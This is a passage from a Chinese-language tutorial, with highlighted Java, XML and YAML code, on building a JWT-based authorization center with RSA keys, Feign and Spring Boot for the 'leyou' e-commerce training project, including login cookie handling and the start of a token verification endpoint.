class="operator">=</span> RsaUtils.getPublicKey(publicFilePath);</span><br><span class="line">        <span class="comment">// 解析token</span></span><br><span class="line">        Payload&lt;UserInfo&gt; info = JwtUtils.getInfoFromToken(token, publicKey, UserInfo.class);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;info.getExpiration() = &quot;</span> + info.getExpiration());</span><br><span class="line">        System.out.println(<span class="string">&quot;info.getUserInfo() = &quot;</span> + info.getUserInfo());</span><br><span class="line">        System.out.println(<span class="string">&quot;info.getId() = &quot;</span> + info.getId());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="授权中心"><a href="#授权中心" class="headerlink" title="授权中心"></a>授权中心</h2><p>授权中心的主要职责：</p>
<ul>
<li>用户登录鉴权(Login)：<ul>
<li>接收用户的登录请求，</li>
<li>通过用户中心的接口校验用户名密码</li>
<li>使用私钥生成JWT并返回</li>
</ul>
</li>
<li>用户登录状态校验<ul>
<li>判断用户是否登录，其实就是token的校验</li>
</ul>
</li>
<li>用户登出<ul>
<li>用户选择退出登录后，要让token失效</li>
</ul>
</li>
<li>用户登录状态刷新<ul>
<li>用户登录一段时间后，JWT可能过期，需要刷新有效期</li>
</ul>
</li>
</ul>
<p>接下来，我们逐一完成上述功能</p>
<h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>我们在实现登录的时候，需要注意几个东西：</p>
<ul>
<li>去用户微服务ly-user查询用户信息</li>
<li>需要秘钥用来生成签名</li>
</ul>
<p>因此有几个问题需要我们去解决：</p>
<ul>
<li><strong>ly-user必须对外提供的接口</strong>，根据用户名和密码查询用户。</li>
<li>授权中心需要公钥和私钥，必须是在<strong>项目启动时就加载</strong>公钥和私钥对象到容器中</li>
</ul>
<h4 id="查询用户接口"><a href="#查询用户接口" class="headerlink" title="查询用户接口"></a>查询用户接口</h4><h5 id="定义接口"><a href="#定义接口" class="headerlink" title="定义接口"></a>定义接口</h5><p>用户中心必须对外提供查询接口，方便ly-auth做用户名密码校验。</p>
<p>首先在<code>ly-user-api</code>定义接口：</p>
<p>引入Feign依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-openfeign-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在<code>ly-user-api</code>的<code>com.leyou.user.client</code>中，添加接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.user.client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.user.dto.UserDTO;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.openfeign.FeignClient;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> 虎哥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@FeignClient(&quot;user-service&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserClient</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据用户名和密码查询用户</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> username 用户名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> password 密码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 用户信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;info&quot;)</span></span><br><span class="line">    UserDTO <span class="title function_">queryUserByUsernameAndPassword</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username, <span class="meta">@RequestParam(&quot;password&quot;)</span> String password)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="ly-auth引用接口"><a href="#ly-auth引用接口" class="headerlink" title="ly-auth引用接口"></a>ly-auth引用接口</h5><p>然后，在ly-auth-service中引入ly-user-interface和feign的依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-openfeign<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.leyou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ly-user-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后在<code>ly-auth</code>的<code>com.leyou.auth</code>包下的启动类<code>LyAuthApplication</code>上添加注解：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.auth;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.auth.config.JwtProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.EnableConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.openfeign.EnableFeignClients;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> 虎哥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@EnableFeignClients(basePackages = &quot;com.leyou.user.client&quot;)</span></span><br><span class="line"><span class="meta">@SpringBootApplication(scanBasePackages = &#123;&quot;com.leyou.auth&quot;, &quot;com.leyou.common.advice&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LyAuthApplication</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(LyAuthApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意：对<code>FeignClient</code>的扫描包要添加到<code>@EnableFeignClients</code>注解里面！</p>
<h4 id="读取公钥和私钥"><a href="#读取公钥和私钥" class="headerlink" title="读取公钥和私钥"></a>读取公钥和私钥</h4><h5 id="编写配置"><a href="#编写配置" class="headerlink" title="编写配置"></a>编写配置</h5><p>我们需要在授权中心<code>ly-uath-service</code>完成授权，肯定要用到公钥、私钥、还有JWT工具，必须知道公钥、私钥文件的位置，另外生成token的有效期等信息，这些可以配置到<code>application.yml</code>中：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">ly:</span></span><br><span class="line">  <span class="comment"># ..</span></span><br><span class="line">  <span class="attr">jwt:</span></span><br><span class="line">    <span class="attr">pubKeyPath:</span> <span class="string">C:/develop/ssh/id_rsa.pub</span> <span class="comment"># 公钥地址</span></span><br><span class="line">    <span class="attr">priKeyPath:</span> <span class="string">C:/develop/ssh/id_rsa</span> <span class="comment"># 私钥地址</span></span><br></pre></td></tr></table></figure>

<h5 id="属性读取"><a href="#属性读取" class="headerlink" title="属性读取"></a>属性读取</h5><p>然后编写属性类，加载这些数据：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.auth.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;ly.jwt&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JwtProperties</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String pubKeyPath;</span><br><span class="line">    <span class="keyword">private</span> String priKeyPath;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="加载公钥和私钥"><a href="#加载公钥和私钥" class="headerlink" title="加载公钥和私钥"></a>加载公钥和私钥</h5><p>思考一下：这个属性类只帮我们读取了公钥和私钥的地址，那么每次使用公钥我们都需要从硬盘读取，效率是不是太低了，能不能在这个类中，直接读取公钥和私钥，保存起来，供以后使用呢？</p>
<p>我们来试一下。</p>
<p>那么问题来了，<strong>加载公钥和私钥的代码应该写在哪里呢？构造函数可以吗？</strong></p>
<p>显然不行，因为构造函数执行时，Spring还没有完成属性注入，此时pubKeyPath和priKeyPath都没有值，我们**<code>必须在Spring完成属性注入后再加载密钥</code>**。</p>
<p>那么，我们如何知道Spring完成了属性注入呢？</p>
<p>这就必须要知道Spring的Bean初始化生命周期了，如图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022677.png" alt="1554617122160"></p>
<p>Spring Bean在Spring Bean Factory Container中完成其整个生命周期：以下是完成其生命周期所需的各种内容：</p>
<ol>
<li>Spring容器从XML文件或@Configuration中bean的定义中实例化bean。</li>
<li>Spring依据配置中指定的属性，为bean填充所有属性。</li>
<li>如果bean实现BeanNameAware接口，spring调用setBeanName()方法，并传递bean的id。</li>
<li>如果bean实现BeanFactoryAware接口，spring将调用setBeanFactory()方法，并把自己作为参数。</li>
<li>如果bean实现ApplicationContextAware接口，spring将调用setApplicationContext()方法，并把ApplicationContext实例作为参数。</li>
<li>如果存在与bean关联的任何BeanPostProcessors（后处理器），则调用preProcessBeforeInitialization()方法。比如Autowired等依赖注入功能是在此时完成。</li>
<li>如果Bean实现了InitializingBean接口，则调用bean的afterPropertiesSet()方法。</li>
<li>如果为bean指定了init-method，那么将调用bean的init方法。</li>
<li>最后，如果存在与bean关联的任何BeanPostProcessors，则将调用postProcessAfterInitialization（）方法。</li>
</ol>
<p>因此，我们加载公钥、私钥可以再7或8的两个位置来完成。比如我们在7的位置，需要两步：</p>
<ul>
<li>实现InitializingBean接口</li>
<li>实现afterPropertiesSet方法，并在方法内加载密钥</li>
</ul>
<p>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.auth.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.RsaUtils;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.InitializingBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.security.PrivateKey;</span><br><span class="line"><span class="keyword">import</span> java.security.PublicKey;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> 虎哥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;ly.jwt&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JwtProperties</span> <span class="keyword">implements</span> <span class="title class_">InitializingBean</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 公钥地址</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String pubKeyPath;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 私钥地址</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String priKeyPath;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> PublicKey publicKey;</span><br><span class="line">    <span class="keyword">private</span> PrivateKey privateKey;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterPropertiesSet</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取公钥和私钥</span></span><br><span class="line">            <span class="built_in">this</span>.publicKey = RsaUtils.getPublicKey(pubKeyPath);</span><br><span class="line">            <span class="built_in">this</span>.privateKey = RsaUtils.getPrivateKey(priKeyPath);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            log.error(<span class="string">&quot;初始化公钥和私钥失败！&quot;</span>, e);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="登录功能"><a href="#登录功能" class="headerlink" title="登录功能"></a>登录功能</h3><p>接下来，我们需要在<code>ly-auth</code>编写一个接口，对外提供登录授权服务。</p>
<p>登录授权流程我们上面已经分析过，基本流程如下：：</p>
<ul>
<li>1、用户请求登录，携带用户名密码到授权中心</li>
<li>2、授权中心携带用户名密码，到用户中心查询用户</li>
<li>3、查询如果正确，生成JWT凭证，查询错误则返回400,</li>
<li>4、把JWT写入用户cookie</li>
</ul>
<h4 id="controller"><a href="#controller" class="headerlink" title="controller"></a>controller</h4><p>接下来我们就在<code>ly-auth</code>的<code>com.leyou.auth.web</code>下添加<code>UserAuthController</code>，并编写登录接口：</p>
<ul>
<li>请求方式：post</li>
<li>请求路径：&#x2F;user&#x2F;login</li>
<li>请求参数：username和password</li>
<li>返回结果：无，直接写入cookie</li>
</ul>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.auth.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.auth.service.UserAuthService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> 虎哥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserAuthController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserAuthService userAuthService;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 登录接口</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> username 用户名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> password 密码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 无</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping(&quot;login&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;Void&gt; <span class="title function_">login</span><span class="params">(</span></span><br><span class="line"><span class="params">            <span class="meta">@RequestParam(&quot;username&quot;)</span> String username,</span></span><br><span class="line"><span class="params">            <span class="meta">@RequestParam(&quot;password&quot;)</span> String password,</span></span><br><span class="line"><span class="params">            HttpServletResponse response)</span>&#123;</span><br><span class="line">        <span class="comment">// 调用service，完成登录</span></span><br><span class="line">        userAuthService.login(username, password, response);</span><br><span class="line">        <span class="comment">// 登录成功，无返回值, 204状态码</span></span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.noContent().build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="service"><a href="#service" class="headerlink" title="service"></a>service</h4><p>service的基本流程：</p>
<ul>
<li>查询用户</li>
<li>生成token</li>
<li>写入cookie</li>
</ul>
<p>这里还有几个属性要配置，包括：</p>
<ul>
<li>cookie名称</li>
<li>cookie的domain属性，决定cookie在哪些域名下生效</li>
</ul>
<p>这三个属性我们定义到一个常量类中，放到<code>ly-common</code>下的 <code>com.leyou.common.constants</code>中</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022678.png" alt="1573815043357"> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.common.constants;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> 虎哥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserTokenConstants</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用户token的cookie名称</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">COOKIE_NAME</span> <span class="operator">=</span> <span class="string">&quot;LY_TOKEN&quot;</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用户token的cookie的domain</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DOMAIN</span> <span class="operator">=</span> <span class="string">&quot;leyou.com&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：cookie的domain决定了cookie作用的域名，写成”<code>leyou.com</code>“可以让<code>leyou.com</code>下的所有二级以上域名共享cookie</p>
<p>在<code>ly-auth-service</code>的<code>com.leyou.auth.service</code>包中定义接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.auth.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> 虎哥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserAuthService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">login</span><span class="params">(String username, String password, HttpServletResponse response)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>ly-auth-service</code>的<code>com.leyou.auth.service.impl</code>包中定义实现类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.auth.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.auth.config.JwtProperties;</span><br><span class="line"><span class="keyword">import</span> com.leyou.auth.service.UserAuthService;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.constants.UserTokenConstants;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.UserInfo;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.exception.LyException;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.CookieUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.JwtUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.user.client.UserClient;</span><br><span class="line"><span class="keyword">import</span> com.leyou.user.dto.UserDTO;</span><br><span class="line"><span class="keyword">import</span> feign.FeignException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> 虎哥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserAuthServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserAuthService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserClient userClient;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> JwtProperties prop;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserAuthServiceImpl</span><span class="params">(UserClient userClient, JwtProperties prop)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userClient = userClient;</span><br><span class="line">        <span class="built_in">this</span>.prop = prop;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">login</span><span class="params">(String username, String password, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="comment">// 1.查询用户</span></span><br><span class="line">        <span class="type">UserDTO</span> <span class="variable">user</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            user = userClient.queryUserByUsernameAndPassword(username, password);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FeignException e) &#123;</span><br><span class="line">            <span class="comment">// 捕获feign的异常，并获取feign调用的状态码和异常信息</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(e.status(), e.contentUTF8(), e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 2.判断查询结果</span></span><br><span class="line">        <span class="keyword">if</span>(user == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">// 查询失败，一定是用户名或密码错误</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;用户名或密码错误&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 3.生成token</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> JwtUtils.generateToken(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">UserInfo</span>(user.getId(), user.getUsername()), prop.getPrivateKey());</span><br><span class="line">        <span class="comment">// 4.写入cookie</span></span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(UserTokenConstants.COOKIE_NAME, token);</span><br><span class="line">        <span class="comment">// cookie的作用域</span></span><br><span class="line">        cookie.setDomain(UserTokenConstants.DOMAIN);</span><br><span class="line">        <span class="comment">// 是否禁止JS操作cookie，避免XSS攻击</span></span><br><span class="line">        cookie.setHttpOnly(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// cookie有效期，-1就是跟随当前会话，浏览器关闭就消失</span></span><br><span class="line">        cookie.setMaxAge(-<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// cookie作用的路径，/代表一切路径</span></span><br><span class="line">        cookie.setPath(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        response.addCookie(cookie);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h4><p>在登录页面填写信息，登录后跳转到首页，发现token成功写入了：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022679.png" alt="1527521423469"></p>
<h3 id="首页判断登录状态"><a href="#首页判断登录状态" class="headerlink" title="首页判断登录状态"></a>首页判断登录状态</h3><p>虽然cookie已经成功写入，但是我们首页的顶部，登录状态依然没能判断出用户信息：</p>
<p> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022680.png" alt="1527521794580"></p>
<p>我们思考一下，应该如何判断用户是否登录呢？</p>
<h4 id="步骤分析"><a href="#步骤分析" class="headerlink" title="步骤分析"></a>步骤分析</h4><p>传统登录校验的步骤：</p>
<ul>
<li>1）用户请求到达服务端，会自动携带cookie</li>
<li>2）cookie中包含sessionId，tomcat根据sessionId获取session</li>
<li>3）从session中读取用户信息，判断是否存在</li>
<li>4）存在，证明已经登录；不存在，证明登录超时或未登录</li>
</ul>
<p>我们现在使用的是无状态登录，不存在session，而是把用户身份写入了token，是否需要发请求到服务端进行校验呢？</p>
<p>肯定需要的，因为token需要通过公钥解析才知道是否有效。</p>
<p>分析一下步骤：</p>
<ul>
<li>1）页面向后台发起请求，携带cookie</li>
<li>2）后台获取cookie中的LY_TOKEN</li>
<li>3）校验token是否有效<ul>
<li>无效：登录失效</li>
<li>有效：解析出里面的用户信息，返回到页面</li>
</ul>
</li>
</ul>
<p>接下来，我们就分步实现上述功能。</p>
<h4 id="页面JS代码"><a href="#页面JS代码" class="headerlink" title="页面JS代码"></a>页面JS代码</h4><p>首先是页面发起请求，校验cookie。</p>
<p>页面的顶部已经被我们封装为一个独立的Vue组件，在<code>/js/pages/shortcut.js</code>中</p>
<p> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022681.png" alt="1527522039407"></p>
<p>打开js，发现里面已经定义好了Vue组件，并且在created函数中，查询用户信息：</p>
<p> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022682.png" alt="image-20200325111841923"></p>
<p>因为token在cookie中，因此本次请求肯定会携带token信息在头中。</p>
<h4 id="校验用户登录状态"><a href="#校验用户登录状态" class="headerlink" title="校验用户登录状态"></a>校验用户登录状态</h4><p>我们在<code>ly-auth</code>中定义用户的校验接口，通过cookie获取token，然后校验通过返回用户信息。</p>
<ul>
<li>请求方式：GET</li>
<li>请求路径：&#x2F;user&#x2F;verify</li>
<li>请求参数：无，不过我们需要从cookie中获取token信息</li>
<li>返回结果：校验成功返回用户名；校验失败，则返回401</li>
</ul>
<p>在<code>ly-auth-service</code>的<code>com.leyou.auth.web</code>包的<code>UserAuthController</code>中添加代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 验证用户信息</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 用户信息</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;verify&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;String&gt; <span class="title function_">verifyUser</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="comment">// 成功后直接返回</span></span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.ok(userAuthService.verifyUser(request));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在<code>ly-auth-service</code>的<code>com.leyou.auth.service</code>包的<code>UserAuthService</code>中添加代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String <span class="title function_">verifyUser</span><span class="params">(HttpServletRequest request)</span>;</span><br></pre></td></tr></table></figure>



<p>在<code>ly-auth-service</code>的<code>com.leyou.auth.service.impl</code>包的<code>UserAuthServiceImpl</code>中添加代码：</p>
